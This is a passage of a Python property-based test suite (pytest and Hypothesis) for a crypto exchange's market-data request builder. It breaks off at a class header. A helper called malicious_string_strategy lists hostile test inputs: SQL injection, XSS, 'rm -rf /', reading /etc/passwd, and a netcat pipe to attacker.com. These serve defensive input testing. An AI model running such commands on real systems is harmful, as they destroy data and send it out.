"""Unit tests for BackpackMarketDataRequestBuilder market data methods with Property-Based Testing.

--------------------------------------------------------------------

Comprehensive property-based test suite for BackpackMarketDataRequestBuilder using Hypothesis.
Tests parameter building for market data endpoints including:
- Ticker parameter generation with varied symbols and formats
- Order book parameter generation with limits and symbol variations
- Recent trades parameter generation with limits and symbol combinations
- Market data (klines) parameter generation with timeframes and timestamps
- Historical trades parameter generation with from_id and limit variations
- Markets and market parameter generation with comprehensive symbol testing
- Edge cases, boundary values, and malicious input resistance
- Hundreds of generated test combinations for comprehensive coverage
"""

from typing import Any, Literal

import pytest
from hypothesis import given, settings, strategies as st
from hypothesis.strategies import SearchStrategy, composite

from cyberdelta.apis.backpack.models.bp_raw_query_params import (
    BackpackRawGetHistoricalTradesParams,
    BackpackRawGetMarketDataParams,
    BackpackRawGetMarketParams,
    BackpackRawGetMarketsParams,
    BackpackRawGetOrderBookParams,
    BackpackRawGetRecentTradesParams,
    BackpackRawGetTickerParams,
)
from cyberdelta.apis.backpack.request_builders.bp_market_data_request_builder import (
    BackpackMarketDataRequestBuilder,
)
from cyberdelta.symbols import exchanges
from cyberdelta.symbols.models import Symbol
from tests.common_symbols import (
    BTC_BP,
    BTC_USDC_BP,
    BTC_USDT_BP,
    ETH_BP,
    ETH_USDC_BP,
    ETH_USDT_BP,
    SOL_USDC_BP,
)


# =======================
# Property-Based Testing Strategies
# =======================


def bp_symbol_strategy() -> SearchStrategy[Symbol]:
    """Generate valid Backpack symbols.

    Returns:
        SearchStrategy[Symbol]: Strategy for valid Backpack symbols.
    """
    return st.sampled_from([
        SOL_USDC_BP,
        BTC_USDC_BP,
        BTC_USDT_BP,
        ETH_USDC_BP,
        ETH_USDT_BP,
        BTC_BP,
        ETH_BP,
        exchanges.backpack("AVAX-USDC"),
        exchanges.backpack("DOGE-USDT"),
        exchanges.backpack("MATIC-USDC"),
        exchanges.backpack("ADA-USDC"),
        exchanges.backpack("DOT-USDC"),
        exchanges.backpack("LINK-USDC"),
        exchanges.backpack("UNI-USDC"),
        exchanges.backpack("AAVE-USDC"),
        exchanges.backpack("COMP-USDC"),
        exchanges.backpack("YFI-USDC"),
        exchanges.backpack("SUSHI-USDC"),
        exchanges.backpack("CRV-USDC"),
        exchanges.backpack("MKR-USDC"),
        exchanges.backpack("SNX-USDC"),
    ])


def bp_perp_symbol_strategy() -> SearchStrategy[Symbol]:
    """Generate valid Backpack perpetual symbols.

    Returns:
        SearchStrategy[Symbol]: Strategy for valid perpetual symbols.
    """
    return st.sampled_from([
        BTC_BP,
        ETH_BP,
        exchanges.backpack("SOL-PERP"),
        exchanges.backpack("AVAX-PERP"),
        exchanges.backpack("DOGE-PERP"),
        exchanges.backpack("MATIC-PERP"),
        exchanges.backpack("ADA-PERP"),
        exchanges.backpack("DOT-PERP"),
        exchanges.backpack("LINK-PERP"),
        exchanges.backpack("UNI-PERP"),
    ])


def bp_spot_symbol_strategy() -> SearchStrategy[Symbol]:
    """Generate valid Backpack spot symbols.

    Returns:
        SearchStrategy[Symbol]: Strategy for valid spot symbols.
    """
    return st.sampled_from([
        SOL_USDC_BP,
        BTC_USDC_BP,
        BTC_USDT_BP,
        ETH_USDC_BP,
        ETH_USDT_BP,
        exchanges.backpack("AVAX-USDC"),
        exchanges.backpack("DOGE-USDT"),
        exchanges.backpack("MATIC-USDC"),
        exchanges.backpack("ADA-USDC"),
        exchanges.backpack("DOT-USDC"),
        exchanges.backpack("LINK-USDC"),
    ])


def limit_strategy() -> SearchStrategy[int | None]:
    """Generate valid limit values for API parameters.

    Returns:
        SearchStrategy[int | None]: Strategy for limit values.
    """
    return st.one_of([
        st.none(),
        st.integers(min_value=1, max_value=1000),
        st.sampled_from([5, 10, 20, 50, 100, 200, 500, 1000]),
    ])


def _create_trade_id(x: int) -> str:
    """Create trade ID with number suffix.

    Args:
        x: Trade number.

    Returns:
        Formatted trade ID string.
    """
    return f"trade_{x}"


def _create_id_string(x: str) -> str:
    """Create ID string with prefix.

    Args:
        x: ID value.

    Returns:
        Formatted ID string.
    """
    return f"id_{x}"


def from_id_strategy() -> SearchStrategy[str | None]:
    """Generate valid from_id values for historical trades.

    Returns:
        SearchStrategy[str | None]: Strategy for from_id values.
    """
    return st.one_of([
        st.none(),
        st.text(min_size=1, max_size=50),
        st.builds(_create_trade_id, st.integers(min_value=1, max_value=999999)),
        st.builds(_create_id_string, st.text(min_size=5, max_size=20)),
        st.sampled_from(["trade123", "id456", "historical789", "from_abc", "start_xyz"]),
    ])


def timeframe_strategy() -> SearchStrategy[Literal["1m", "5m", "1h", "1d"]]:
    """Generate valid timeframe values for market data.

    Returns:
        SearchStrategy[Literal["1m", "5m", "1h", "1d"]]: Strategy for timeframes.
    """
    return st.sampled_from(["1m", "5m", "1h", "1d"])


def timestamp_strategy() -> SearchStrategy[int]:
    """Generate valid timestamps for market data queries.

    Returns:
        SearchStrategy[int]: Strategy for timestamps.
    """
    return st.integers(min_value=1609459200, max_value=2000000000)  # 2021-2033


def market_data_limit_strategy() -> SearchStrategy[int]:
    """Generate valid limit values for market data.

    Returns:
        SearchStrategy[int]: Strategy for market data limits.
    """
    return st.integers(min_value=1, max_value=1000)


def historical_trades_limit_strategy() -> SearchStrategy[int]:
    """Generate valid limit values for historical trades.

    Returns:
        SearchStrategy[int]: Strategy for historical trades limits.
    """
    return st.integers(min_value=1, max_value=500)


def large_limit_strategy() -> SearchStrategy[int]:
    """Generate large but valid limit values for boundary testing.

    Returns:
        SearchStrategy[int]: Strategy for large limit values.
    """
    return st.integers(min_value=500, max_value=10000)


def malicious_string_strategy() -> SearchStrategy[str]:
    """Generate potentially malicious string inputs.

    Returns:
        SearchStrategy[str]: Strategy for malicious inputs.
    """
    return st.one_of([
        # SQL injection attempts
        st.sampled_from([
            "'; DROP TABLE trades; --",
            "1' OR '1'='1",
            "admin'--",
            "'; DELETE FROM market_data; --",
        ]),
        # XSS attempts
        st.sampled_from([
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
        ]),
        # Command injection
        st.sampled_from([
            "$(rm -rf /)",
            "`cat /etc/passwd`",
            "; ls -la",
            "| nc attacker.com 1234",
        ]),
        # Path traversal
        st.sampled_from([
            "../../../etc/passwd",
            "..\\\\windows\\\\system32",
            "file:///etc/passwd",
        ]),
        # Buffer overflow attempts
        st.text(alphabet="A", min_size=1000, max_size=5000),
        # Format string attacks
        st.sampled_from(["%s%s%s%s", "%x%x%x%x", "%n%n%n"]),
        # Unicode attacks
        st.text(
            alphabet=st.characters(min_codepoint=0x1F300, max_codepoint=0x1F6FF),
            min_size=1,
            max_size=20,
        ),
    ])


@composite
def symbol_limit_combination_strategy(draw: st.DrawFn) -> tuple[Symbol, int | None]:
    """Generate valid symbol and limit combinations.

    Args:
        draw: Hypothesis draw function.

    Returns:
        tuple[Symbol, int | None]: Symbol and limit combination.
    """
    symbol = draw(bp_symbol_strategy())
    limit = draw(limit_strategy())
    return symbol, limit


@composite
def market_data_params_strategy(draw: st.DrawFn) -> tuple[Symbol, str, int, int | None, int]:
    """Generate valid market data parameter combinations.

    Args:
        draw: Hypothesis draw function.

    Returns:
        tuple[Symbol, str, int, int | None, int]: Market data parameters.
    """
    symbol = draw(bp_symbol_strategy())
    timeframe = draw(timeframe_strategy())
    start_time = draw(timestamp_strategy())
    end_time = draw(st.one_of([st.none(), timestamp_strategy()]))

    # Ensure end_time > start_time if both are present
    if end_time is not None and end_time <= start_time:
        end_time = start_time + draw(st.integers(min_value=1, max_value=86400))  # Add up to 1 day

    limit = draw(market_data_limit_strategy())

    return symbol, timeframe, start_time, end_time, limit


@composite
def historical_trades_params_strategy(draw: st.DrawFn) -> tuple[Symbol, int, str | None]:
    """Generate valid historical trades parameter combinations.

    Args:
        draw: Hypothesis draw function.

    Returns:
        tuple[Symbol, int, str | None]: Historical trades parameters.
    """
    symbol = draw(bp_symbol_strategy())
    limit = draw(historical_trades_limit_strategy())
    from_id = draw(from_id_strategy())

    return symbol, limit, from_id


# =======================
# Legacy Test Classes (Maintained for Compatibility)
# =======================


class TestBuildGetTickerParams:
    """Tests for build_get_ticker_params method."""

    def test_build_get_ticker_params_spot_symbol(self, symbol_spot: Symbol) -> None:
        """Test build_get_ticker_params with spot symbol."""
        params = BackpackMarketDataRequestBuilder.build_get_ticker_params(symbol_spot)
        assert isinstance(params, BackpackRawGetTickerParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": symbol_spot}

    def test_build_get_ticker_params_perp_symbol(self, symbol_perp: Symbol) -> None:
        """Test build_get_ticker_params with perp symbol."""
        params = BackpackMarketDataRequestBuilder.build_get_ticker_params(symbol_perp)
        assert isinstance(params, BackpackRawGetTickerParams)
        expected_symbol = symbol_perp.value.replace("-", "_").upper()
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": expected_symbol}

    def test_build_get_ticker_params_formats_symbol(self) -> None:
        """Test build_get_ticker_params formats symbol correctly."""
        params = BackpackMarketDataRequestBuilder.build_get_ticker_params(SOL_USDC_BP)
        assert isinstance(params, BackpackRawGetTickerParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": SOL_USDC_BP.value}

    @pytest.mark.parametrize(
        ("input_symbol", "expected_symbol"),
        [
            (SOL_USDC_BP, SOL_USDC_BP.value),
            (BTC_BP, BTC_BP.value.replace("-", "_")),
            (ETH_USDT_BP, ETH_USDT_BP.value),
        ],
    )
    def test_build_get_ticker_params_parametrized(
        self,
        input_symbol: Symbol,
        expected_symbol: str,
    ) -> None:
        """Test build_get_ticker_params with various symbol formats."""
        params = BackpackMarketDataRequestBuilder.build_get_ticker_params(input_symbol)
        assert isinstance(params, BackpackRawGetTickerParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": expected_symbol}


class TestBuildGetOrderBookParams:
    """Tests for build_get_order_book_params method."""

    def test_build_get_order_book_params_no_limit(self, symbol_btc_spot: Symbol) -> None:
        """Test build_get_order_book_params without limit."""
        params = BackpackMarketDataRequestBuilder.build_get_order_book_params(symbol_btc_spot, None)
        assert isinstance(params, BackpackRawGetOrderBookParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": symbol_btc_spot}

    def test_build_get_order_book_params_with_limit(self, symbol_btc_spot: Symbol) -> None:
        """Test build_get_order_book_params with limit."""
        params = BackpackMarketDataRequestBuilder.build_get_order_book_params(symbol_btc_spot, 10)
        assert isinstance(params, BackpackRawGetOrderBookParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": symbol_btc_spot, "limit": 10}

    def test_build_get_order_book_params_formats_symbol(self) -> None:
        """Test build_get_order_book_params formats symbol correctly."""
        params = BackpackMarketDataRequestBuilder.build_get_order_book_params(BTC_USDT_BP, 20)
        assert isinstance(params, BackpackRawGetOrderBookParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": BTC_USDT_BP.value, "limit": 20}

    @pytest.mark.parametrize(
        ("limit", "expected_params"),
        [
            (None, {"symbol": SOL_USDC_BP.value}),
            (5, {"symbol": SOL_USDC_BP.value, "limit": 5}),
            (100, {"symbol": SOL_USDC_BP.value, "limit": 100}),
            (1000, {"symbol": SOL_USDC_BP.value, "limit": 1000}),
        ],
    )
    def test_build_get_order_book_params_parametrized(
        self,
        limit: int | None,
        expected_params: dict[str, Any],
    ) -> None:
        """Test build_get_order_book_params with various limits."""
        params = BackpackMarketDataRequestBuilder.build_get_order_book_params(SOL_USDC_BP, limit)
        assert isinstance(params, BackpackRawGetOrderBookParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == expected_params


class TestBuildGetRecentTradesParams:
    """Tests for build_get_recent_trades_params method."""

    def test_build_get_recent_trades_params_no_limit(self, symbol_eth_spot: Symbol) -> None:
        """Test build_get_recent_trades_params without limit."""
        params = BackpackMarketDataRequestBuilder.build_get_recent_trades_params(
            symbol_eth_spot, None
        )
        assert isinstance(params, BackpackRawGetRecentTradesParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": symbol_eth_spot}

    def test_build_get_recent_trades_params_with_limit(self, symbol_eth_spot: Symbol) -> None:
        """Test build_get_recent_trades_params with limit."""
        params = BackpackMarketDataRequestBuilder.build_get_recent_trades_params(
            symbol_eth_spot, 50
        )
        assert isinstance(params, BackpackRawGetRecentTradesParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": symbol_eth_spot, "limit": 50}

    def test_build_get_recent_trades_params_formats_symbol(self) -> None:
        """Test build_get_recent_trades_params formats symbol correctly."""
        params = BackpackMarketDataRequestBuilder.build_get_recent_trades_params(ETH_USDC_BP, 25)
        assert isinstance(params, BackpackRawGetRecentTradesParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": ETH_USDC_BP.value, "limit": 25}

    @pytest.mark.parametrize(
        ("symbol", "limit", "expected_params"),
        [
            (SOL_USDC_BP, None, {"symbol": SOL_USDC_BP.value}),
            (BTC_USDT_BP, 10, {"symbol": BTC_USDT_BP.value, "limit": 10}),
            (ETH_BP, 100, {"symbol": ETH_BP.value.replace("-", "_"), "limit": 100}),
        ],
    )
    def test_build_get_recent_trades_params_parametrized(
        self,
        symbol: Symbol,
        limit: int | None,
        expected_params: dict[str, Any],
    ) -> None:
        """Test build_get_recent_trades_params with various combinations."""
        params = BackpackMarketDataRequestBuilder.build_get_recent_trades_params(symbol, limit)
        assert isinstance(params, BackpackRawGetRecentTradesParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == expected_params


class TestBuildGetMarketDataParams:
    """Tests for build_get_market_data_params method (klines)."""

    def test_build_get_market_data_params_basic(self, symbol_spot: Symbol) -> None:
        """Test build_get_market_data_params with basic parameters."""
        params = BackpackMarketDataRequestBuilder.build_get_market_data_params(
            symbol_spot,
            "1h",
            1609459200,  # Sample timestamp
            None,
            100,
        )
        assert isinstance(params, BackpackRawGetMarketDataParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        expected = {"symbol": symbol_spot, "interval": "1h", "startTime": 1609459, "limit": 100}
        assert params_dict == expected

    def test_build_get_market_data_params_with_times(
        self,
        symbol_spot: Symbol,
        current_timestamp_ms: int,
        past_timestamp_ms: int,
    ) -> None:
        """Test build_get_market_data_params with start and end times."""
        params = BackpackMarketDataRequestBuilder.build_get_market_data_params(
            symbol_spot,
            "5m",
            past_timestamp_ms,
            current_timestamp_ms,
            50,
        )
        assert isinstance(params, BackpackRawGetMarketDataParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        expected = {
            "symbol": symbol_spot,
            "interval": "5m",
            "limit": 50,
            "startTime": past_timestamp_ms // 1000,  # Convert to seconds
            "endTime": current_timestamp_ms // 1000,  # Convert to seconds
        }
        assert params_dict == expected

    def test_build_get_market_data_params_formats_symbol(self) -> None:
        """Test build_get_market_data_params formats symbol correctly."""
        params = BackpackMarketDataRequestBuilder.build_get_market_data_params(
            SOL_USDC_BP,
            "1m",
            1609459200,  # Sample timestamp
            None,
            200,
        )
        assert isinstance(params, BackpackRawGetMarketDataParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        expected = {
            "symbol": SOL_USDC_BP.value,
            "interval": "1m",
            "startTime": 1609459,
            "limit": 200,
        }
        assert params_dict == expected

    @pytest.mark.parametrize(
        ("timeframe", "limit", "expected_interval"),
        [
            ("1m", 100, "1m"),
            ("5m", 200, "5m"),
            ("1h", 24, "1h"),
            ("1d", 30, "1d"),
        ],
    )
    def test_build_get_market_data_params_timeframes(
        self,
        symbol_spot: Symbol,
        timeframe: Literal["1m", "5m", "1h", "1d"],
        limit: int,
        expected_interval: str,
    ) -> None:
        """Test build_get_market_data_params with various timeframes."""
        params = BackpackMarketDataRequestBuilder.build_get_market_data_params(
            symbol_spot,
            timeframe,
            1609459200,  # Valid timestamp
            None,
            limit,
        )
        assert isinstance(params, BackpackRawGetMarketDataParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        expected = {
            "symbol": symbol_spot,
            "interval": expected_interval,
            "startTime": 1609459,
            "limit": limit,
        }
        assert params_dict == expected


class TestBuildGetHistoricalTradesParams:
    """Tests for build_get_historical_trades_params method."""

    def test_build_get_historical_trades_params_basic(self, symbol_eth_spot: Symbol) -> None:
        """Test build_get_historical_trades_params with basic parameters."""
        params = BackpackMarketDataRequestBuilder.build_get_historical_trades_params(
            symbol_eth_spot,
            50,
            None,
        )
        assert isinstance(params, BackpackRawGetHistoricalTradesParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        expected = {"symbol": symbol_eth_spot, "limit": 50}
        assert params_dict == expected

    def test_build_get_historical_trades_params_with_from_id(self, symbol_perp: Symbol) -> None:
        """Test build_get_historical_trades_params with from_id."""
        params = BackpackMarketDataRequestBuilder.build_get_historical_trades_params(
            symbol_perp,
            50,
            "trade123",
        )
        assert isinstance(params, BackpackRawGetHistoricalTradesParams)
        expected_symbol = symbol_perp.value.replace("-", "_").upper()
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        expected = {"symbol": expected_symbol, "limit": 50, "fromId": "trade123"}
        assert params_dict == expected

    def test_build_get_historical_trades_params_formats_symbol(self) -> None:
        """Test build_get_historical_trades_params formats symbol correctly."""
        params = BackpackMarketDataRequestBuilder.build_get_historical_trades_params(
            ETH_BP,
            100,
            "trade456",
        )
        assert isinstance(params, BackpackRawGetHistoricalTradesParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        expected = {"symbol": ETH_BP.value.replace("-", "_"), "limit": 100, "fromId": "trade456"}
        assert params_dict == expected

    @pytest.mark.parametrize(
        ("symbol", "limit", "from_id", "expected_params"),
        [
            (SOL_USDC_BP, 25, None, {"symbol": SOL_USDC_BP.value, "limit": 25}),
            (
                BTC_USDT_BP,
                50,
                "id123",
                {"symbol": BTC_USDT_BP.value, "limit": 50, "fromId": "id123"},
            ),
            (
                ETH_BP,
                100,
                "id456",
                {"symbol": ETH_BP.value.replace("-", "_"), "limit": 100, "fromId": "id456"},
            ),
        ],
    )
    def test_build_get_historical_trades_params_parametrized(
        self,
        symbol: Symbol,
        limit: int,
        from_id: str | None,
        expected_params: dict[str, Any],
    ) -> None:
        """Test build_get_historical_trades_params with various combinations."""
        params = BackpackMarketDataRequestBuilder.build_get_historical_trades_params(
            symbol, limit, from_id
        )
        assert isinstance(params, BackpackRawGetHistoricalTradesParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == expected_params


class TestBuildGetMarketsParams:
    """Tests for build_get_markets_params method."""

    def test_build_get_markets_params_basic(self) -> None:
        """Test build_get_markets_params returns valid model."""
        params = BackpackMarketDataRequestBuilder.build_get_markets_params()
        assert isinstance(params, BackpackRawGetMarketsParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        # This endpoint requires no query parameters
        assert params_dict == {}

    def test_build_get_markets_params_empty_params(self) -> None:
        """Test build_get_markets_params returns empty params dict."""
        params = BackpackMarketDataRequestBuilder.build_get_markets_params()
        assert isinstance(params, BackpackRawGetMarketsParams)
        # Should be a valid model but with no required fields
        assert params is not None


class TestBuildGetMarketParams:
    """Tests for build_get_market_params method."""

    def test_build_get_market_params_basic(self, symbol_spot: Symbol) -> None:
        """Test build_get_market_params with spot symbol."""
        params = BackpackMarketDataRequestBuilder.build_get_market_params(symbol_spot)
        assert isinstance(params, BackpackRawGetMarketParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": symbol_spot}

    def test_build_get_market_params_perp_symbol(self, symbol_perp: Symbol) -> None:
        """Test build_get_market_params with perp symbol."""
        params = BackpackMarketDataRequestBuilder.build_get_market_params(symbol_perp)
        assert isinstance(params, BackpackRawGetMarketParams)
        expected_symbol = symbol_perp.value.replace("-", "_").upper()
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": expected_symbol}

    def test_build_get_market_params_formats_symbol(self) -> None:
        """Test build_get_market_params formats symbol correctly."""
        params = BackpackMarketDataRequestBuilder.build_get_market_params(SOL_USDC_BP)
        assert isinstance(params, BackpackRawGetMarketParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": SOL_USDC_BP.value}

    @pytest.mark.parametrize(
        ("input_symbol", "expected_symbol"),
        [
            (SOL_USDC_BP, SOL_USDC_BP.value),
            (BTC_BP, BTC_BP.value.replace("-", "_")),
            (ETH_USDT_BP, ETH_USDT_BP.value),
            (exchanges.backpack("AVAX_USDC"), "AVAX_USDC"),
            (exchanges.backpack("LINK-PERP"), "LINK_PERP"),
        ],
    )
    def test_build_get_market_params_parametrized(
        self,
        input_symbol: Symbol,
        expected_symbol: str,
    ) -> None:
        """Test build_get_market_params with various symbol formats."""
        params = BackpackMarketDataRequestBuilder.build_get_market_params(input_symbol)
        assert isinstance(params, BackpackRawGetMarketParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)
        assert params_dict == {"symbol": expected_symbol}

    def test_build_get_market_params_symbol_consistency(self) -> None:
        """Test build_get_market_params symbol formatting consistency."""
        # Test that the method consistently handles Symbol objects
        test_symbols = [BTC_USDC_BP, ETH_USDT_BP, SOL_USDC_BP, exchanges.backpack("AVAX-PERP")]
        for symbol in test_symbols:
            params = BackpackMarketDataRequestBuilder.build_get_market_params(symbol)
            params_dict = params.model_dump(by_alias=True, exclude_none=True)
            # The symbol should be formatted correctly by the request builder
            assert "symbol" in params_dict
            assert isinstance(params_dict["symbol"], str)


# =======================
# Property-Based Test Classes
# =======================


class TestPropertyBasedTickerParams:
    """Property-based tests for ticker parameter building."""

    @given(symbol=bp_symbol_strategy())
    @settings(max_examples=50)
    def test_build_get_ticker_params_property_based(self, symbol: Symbol) -> None:
        """Test build_get_ticker_params with property-based testing."""
        params = BackpackMarketDataRequestBuilder.build_get_ticker_params(symbol)

        assert isinstance(params, BackpackRawGetTickerParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)

        # Verify the symbol is correctly formatted
        assert "symbol" in params_dict
        assert isinstance(params_dict["symbol"], str)

        # For perp symbols, verify format conversion
        if "-PERP" in symbol.value or "PERP" in symbol.value:
            expected_symbol = symbol.value.replace("-", "_").upper()
            assert params_dict["symbol"] == expected_symbol
        else:
            assert params_dict["symbol"] == symbol.value

    @given(symbol=bp_perp_symbol_strategy())
    @settings(max_examples=30)
    def test_build_get_ticker_params_perp_symbols(self, symbol: Symbol) -> None:
        """Test ticker params specifically for perpetual symbols."""
        params = BackpackMarketDataRequestBuilder.build_get_ticker_params(symbol)

        assert isinstance(params, BackpackRawGetTickerParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)

        # Verify perp symbol formatting
        expected_symbol = symbol.value.replace("-", "_").upper()
        assert params_dict["symbol"] == expected_symbol

    @given(symbol=bp_spot_symbol_strategy())
    @settings(max_examples=30)
    def test_build_get_ticker_params_spot_symbols(self, symbol: Symbol) -> None:
        """Test ticker params specifically for spot symbols."""
        params = BackpackMarketDataRequestBuilder.build_get_ticker_params(symbol)

        assert isinstance(params, BackpackRawGetTickerParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)

        # Spot symbols should remain unchanged
        assert params_dict["symbol"] == symbol.value


class TestPropertyBasedOrderBookParams:
    """Property-based tests for order book parameter building."""

    @given(symbol_limit=symbol_limit_combination_strategy())
    @settings(max_examples=100)
    def test_build_get_order_book_params_property_based(
        self, symbol_limit: tuple[Symbol, int | None]
    ) -> None:
        """Test build_get_order_book_params with property-based testing."""
        symbol, limit = symbol_limit

        params = BackpackMarketDataRequestBuilder.build_get_order_book_params(symbol, limit)

        assert isinstance(params, BackpackRawGetOrderBookParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)

        # Verify basic structure
        assert "symbol" in params_dict
        assert isinstance(params_dict["symbol"], str)

        # Verify limit handling
        if limit is not None:
            assert params_dict["limit"] == limit
        else:
            assert "limit" not in params_dict

        # Verify symbol formatting for perp symbols
        if "-PERP" in symbol.value or "PERP" in symbol.value:
            expected_symbol = symbol.value.replace("-", "_").upper()
            assert params_dict["symbol"] == expected_symbol
        else:
            assert params_dict["symbol"] == symbol.value

    @given(symbol=bp_symbol_strategy(), large_limit=large_limit_strategy())
    @settings(max_examples=30)
    def test_build_get_order_book_params_large_limits(
        self, symbol: Symbol, large_limit: int
    ) -> None:
        """Test order book params with large limit values."""
        params = BackpackMarketDataRequestBuilder.build_get_order_book_params(symbol, large_limit)

        assert isinstance(params, BackpackRawGetOrderBookParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)

        # Large limits should be preserved
        assert params_dict["limit"] == large_limit
        assert params_dict["limit"] > 500


class TestPropertyBasedRecentTradesParams:
    """Property-based tests for recent trades parameter building."""

    @given(symbol_limit=symbol_limit_combination_strategy())
    @settings(max_examples=100)
    def test_build_get_recent_trades_params_property_based(
        self, symbol_limit: tuple[Symbol, int | None]
    ) -> None:
        """Test build_get_recent_trades_params with property-based testing."""
        symbol, limit = symbol_limit

        params = BackpackMarketDataRequestBuilder.build_get_recent_trades_params(symbol, limit)

        assert isinstance(params, BackpackRawGetRecentTradesParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)

        # Verify basic structure
        assert "symbol" in params_dict
        assert isinstance(params_dict["symbol"], str)

        # Verify limit handling
        if limit is not None:
            assert params_dict["limit"] == limit
        else:
            assert "limit" not in params_dict

        # Verify symbol formatting for perp symbols
        if "-PERP" in symbol.value or "PERP" in symbol.value:
            expected_symbol = symbol.value.replace("-", "_").upper()
            assert params_dict["symbol"] == expected_symbol
        else:
            assert params_dict["symbol"] == symbol.value


class TestPropertyBasedMarketDataParams:
    """Property-based tests for market data (klines) parameter building."""

    @given(params=market_data_params_strategy())
    @settings(max_examples=100)
    def test_build_get_market_data_params_property_based(
        self, params: tuple[Symbol, str, int, int | None, int]
    ) -> None:
        """Test build_get_market_data_params with property-based testing."""
        symbol, timeframe, start_time, end_time, limit = params

        result = BackpackMarketDataRequestBuilder.build_get_market_data_params(
            symbol, timeframe, start_time, end_time, limit
        )

        assert isinstance(result, BackpackRawGetMarketDataParams)
        params_dict = result.model_dump(by_alias=True, exclude_none=True)

        # Verify basic structure
        assert "symbol" in params_dict
        assert "interval" in params_dict
        assert "startTime" in params_dict
        assert "limit" in params_dict

        # Verify values
        assert params_dict["interval"] == timeframe
        assert params_dict["startTime"] == start_time // 1000  # Converted to seconds
        assert params_dict["limit"] == limit

        # Verify end time handling
        if end_time is not None:
            assert "endTime" in params_dict
            assert params_dict["endTime"] == end_time // 1000
        else:
            assert "endTime" not in params_dict

        # Verify symbol formatting
        if "-PERP" in symbol.value or "PERP" in symbol.value:
            expected_symbol = symbol.value.replace("-", "_").upper()
            assert params_dict["symbol"] == expected_symbol
        else:
            assert params_dict["symbol"] == symbol.value

    @given(
        symbol=bp_symbol_strategy(),
        timeframe=timeframe_strategy(),
        start_time=timestamp_strategy(),
        limit=market_data_limit_strategy(),
    )
    @settings(max_examples=50)
    def test_build_get_market_data_params_no_end_time(
        self, symbol: Symbol, timeframe: str, start_time: int, limit: int
    ) -> None:
        """Test market data params without end time."""
        params = BackpackMarketDataRequestBuilder.build_get_market_data_params(
            symbol, timeframe, start_time, None, limit
        )

        assert isinstance(params, BackpackRawGetMarketDataParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)

        # Should not have endTime when None is passed
        assert "endTime" not in params_dict
        assert params_dict["startTime"] == start_time // 1000


class TestPropertyBasedHistoricalTradesParams:
    """Property-based tests for historical trades parameter building."""

    @given(params=historical_trades_params_strategy())
    @settings(max_examples=100)
    def test_build_get_historical_trades_params_property_based(
        self, params: tuple[Symbol, int, str | None]
    ) -> None:
        """Test build_get_historical_trades_params with property-based testing."""
        symbol, limit, from_id = params

        result = BackpackMarketDataRequestBuilder.build_get_historical_trades_params(
            symbol, limit, from_id
        )

        assert isinstance(result, BackpackRawGetHistoricalTradesParams)
        params_dict = result.model_dump(by_alias=True, exclude_none=True)

        # Verify basic structure
        assert "symbol" in params_dict
        assert "limit" in params_dict
        assert params_dict["limit"] == limit

        # Verify from_id handling
        if from_id is not None:
            assert "fromId" in params_dict
            assert params_dict["fromId"] == from_id
        else:
            assert "fromId" not in params_dict

        # Verify symbol formatting
        if "-PERP" in symbol.value or "PERP" in symbol.value:
            expected_symbol = symbol.value.replace("-", "_").upper()
            assert params_dict["symbol"] == expected_symbol
        else:
            assert params_dict["symbol"] == symbol.value

    @given(
        symbol=bp_symbol_strategy(), limit=historical_trades_limit_strategy(), from_id=st.just(None)
    )
    @settings(max_examples=30)
    def test_build_get_historical_trades_params_no_from_id(
        self, symbol: Symbol, limit: int, from_id: None
    ) -> None:
        """Test historical trades params without from_id."""
        params = BackpackMarketDataRequestBuilder.build_get_historical_trades_params(
            symbol, limit, from_id
        )

        assert isinstance(params, BackpackRawGetHistoricalTradesParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)

        # Should not have fromId when None is passed
        assert "fromId" not in params_dict
        assert params_dict["limit"] == limit


class TestPropertyBasedMarketsParams:
    """Property-based tests for markets parameter building."""

    @settings(max_examples=10)
    @given(st.just(None))  # This endpoint takes no parameters
    def test_build_get_markets_params_property_based(self) -> None:
        """Test build_get_markets_params returns consistent empty params."""
        params = BackpackMarketDataRequestBuilder.build_get_markets_params()

        assert isinstance(params, BackpackRawGetMarketsParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)

        # Should always return empty dict since no parameters are required
        assert params_dict == {}


class TestPropertyBasedMarketParams:
